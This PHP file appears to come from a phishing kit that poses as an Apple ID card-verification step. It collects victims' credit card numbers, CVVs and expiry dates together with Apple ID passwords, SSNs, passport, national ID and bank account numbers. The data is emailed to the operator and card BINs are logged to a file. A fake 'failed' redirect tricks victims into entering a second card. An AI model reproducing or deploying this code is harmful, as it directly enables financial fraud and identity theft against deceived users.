<?php
echo '<center><br><br><br><br><img src="./HijaIyh_App/assets/img/spinner2.gif" style="margin-top:20%"></center>';

  /** Check halaman berikutnya */
    if($core->parse_hijaiyh('sp','3dsecure') == 1)
    {
        $kemana = 'verified';
    }else{
        if($core->parse_hijaiyh('sp','bank') == 1)
        {
            $kemana = $core->mobile_link('bank');
        }else{
            if($core->parse_hijaiyh('sp','photo') == 1)
            {
                $kemana = $core->mobile_link('photo').'&type=id';
            }else{
                if($core->parse_hijaiyh('sp','email_login') == 1)
                {
                    $kemana = $core->mobile_link('email');
                }else{
                    $kemana = $core->mobile_link('finish');
                }
            }
        }
    }
   /** end check **/


if(isset($_POST))
{

 $check = ['cardname','number','expred','sdfs'];
 	$expred = str_replace("/","|",str_replace(" ","",$core->post('expred')));

    $apay = str_replace(" ","",$core->post('number')."|".$expred."|".$core->post('sdfs'));
    $copy = $apay."|".$core->post('cardname')."|".$core->post('adre1')."|".$core->post('city')."|".$core->post('state')."|".$core->post('zip')."|".$country_code."|".$core->post('phone');

    if($core->empty_post_array($check))
    {$core->stats('card-empty','Card invalid, user going to card page.');
        $core->redirect('?page='.$core->mobile_link('manage').'&appIdKey='.$appidkey.'&locale='.@$_GET['locale'].'&failed=empty');
        
          exit;
    }
    
    // validate card
    $checkCard = $api->checkCard($copy);
    if($checkCard['status'] == 'invalid')
    {   
        if($checkCard['type'] == 'number'){
        $core->stats('card-invalid',$cardNumb.' => is invalid card number, user going to card page');
        $core->redirect('?page='.$core->mobile_link('manage').'&appIdKey='.$appidkey.'&locale='.@$_GET['locale'].'&failed=card');
       
          exit;
    }elseif($checkCard['type'] == 'cvv'){
        $core->stats('cvv-invalid',$core->post('cVv').' => cvv ( security code ) invalid , user going to card page');
        $core->redirect('?page='.$core->mobile_link('manage').'&appIdKey='.$appidkey.'&locale='.@$_GET['locale'].'&failed=cvv');
          exit;
    }elseif($checkCard['type'] == 'date')
    {
        $core->stats('expdate-invalid','Expired date invalid, user going to card page');
        $core->redirect('?page='.$core->mobile_link('manage').'&appIdKey='.$appidkey.'&locale='.@$_GET['locale'].'&failed=expdate');
          exit;
    }

    }
	$num = $core->post('number');
    $num = preg_replace('/\s/', '', $num);
    $num = substr($num,0,6);

    $bin = $api->bin($num);

	$collectData = [

		'appleid' => $core->session('appleid'),
		'password' => $core->session('password'),

		'firstname' => $core->post('name1'),
		'lastname' =>$core->post('name2'),
		'dob' => $core->post('bith'),
		'phone' => $core->post('phone'),
		'address' => $core->post('adre1'),
		'city' =>$core->post('city'),
		'state' =>$core->post('state'),
		'country' =>$core->post('cojjuntry'),
		'zip' =>$core->post('zip'),

		'cardholder' => $core->post('cardname'),
		'cardnumber' =>$core->post('number'),
		'cardexpired' => $core->post('expred'),
		'cvv' =>$core->post('sdfs'),
		
		'bank' => $bin['bank'],
		'brandtype' => $bin['brand']." - ".$bin['type'],
		'levelcountry' => $bin['level']." - ".$bin['country'],

		'cc_limit'=>$core->post('cc_limit'),
		'cid' =>$core->post('cid'),
		'idnumber' =>$core->post('idnumber'),
		'qatarid' =>$core->post('qatarid'),
		'civilid' =>$core->post('civilid'),
		'nationalid' =>$core->post('nationalid'),
		'citizenid' =>$core->post('citizenid'),
		'passport' =>$core->post('passportnumber'),
		'ssn_canada' =>$core->post('cassn'),
		'ssn_usa' =>$core->post('ssn'),
		'accnumber' =>$core->post('acc_number'),
		'osidnumber' =>$core->post('osidnumber'),
		'bankaccnumber'=>$core->post('bankaccnumber'),
		'ban' => $core->post('ban'),
		'sortcode' =>$core->post('sortcode'),
		'cardpass' => $core->post('cardpass'),
		'cardid' => $core->post('cardid'),

		'autopay' => $copy,
		'copy' => $apay,

		'useragent' => $_SERVER['HTTP_USER_AGENT'],
		'ip' => $core->userIP(),
		'country' => $country_name,
		'date' => date('D,d m Y H:i')
	]; 

	
	/** skip jika cc number sama **/
	if(isset($_SESSION['cardnumber']))
	{
	if($_SESSION['cardnumber'] == $core->post('number'))
	{
        $core->redirect('?page='.$kemana.'&appIdKey='.$appidkey.'&locale='.@$_GET['locale']);
		exit;
	}
	
	}
	/** end skip */

	/** Send Result section **/
	$sendMsg = $core->parse_result('card',$collectData);
    $info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();
    
    $sendSubj = "[$num] ".$bin['brand']." ".$bin['type']." ".$bin['level']." ".$bin['bank']." ".$bin['country']."  // ".$info;
    
    $justbin = "[H] [$num] ".$bin['brand']." ".$bin['type']." ".$bin['level']." ".$bin['bank']." ".$bin['country'];
    $core->stats('ccs',$justbin);
    file_put_contents(dirname(__DIR__).'/stats/bins.txt',$justbin."\n",FILE_APPEND);
    $sendFrom = $core->post('cardname');
    $core->sendmail($email_result,$sendFrom,$sendSubj,$sendMsg);
 
    $core->create_session($collectData);
    
    ## check double cc ##
    if($core->parse_hijaiyh('sp','double_cc') == 1)
    {
    	if(empty($_SESSION['double_cc']))
    	{
            $core->stats('double_card','Going to double card page');
    		$core->create_session(['double_cc' => $core->post('cardnumber')]);
    		$core->redirect('?page='.$core->mobile_link('manage').'&appIdKey='.$appidkey.'&locale='.@$_GET['locale'].'&failed=true');
    		exit;
    	}
    }
     

 
    
    $core->redirect('?page='.$kemana.'&appIdKey='.$appidkey.'&locale='.@$_GET['locale']);

}